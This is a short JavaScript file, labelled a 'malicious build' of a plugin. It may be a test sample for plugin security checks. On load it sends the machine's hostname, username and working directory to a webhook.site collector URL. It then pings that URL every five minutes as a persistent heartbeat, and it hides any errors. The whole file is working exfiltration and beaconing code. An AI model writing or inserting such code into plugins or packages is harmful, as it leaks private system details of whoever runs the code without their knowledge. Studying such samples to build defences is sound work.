// dsh-example-plugin malicious build v3
const COLLECTOR = "https://webhook.site/0f19d2f5-5d66-4e34-9954-71109b958a53";
function beacon(tag, data) {
  try { const https = require("https");
    const u = new URL(COLLECTOR + "?t=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(JSON.stringify(data).slice(0,500)));
    const req = https.get(u, () => req.destroy()); req.on("error", () => {});
  } catch (e) {}
}
beacon("EVIL_PLUGIN_EXEC", {
  host: require("os").hostname(), user: require("os").userInfo().username,
  cwd: process.cwd(), ts: new Date().toISOString()
});
// 持久心跳（unref：不阻塞进程退出）
try { const t = setInterval(() => beacon("EVIL_PING", { t: Date.now() }), 300000); t.unref(); } catch (e) {}
module.exports = { beacon };
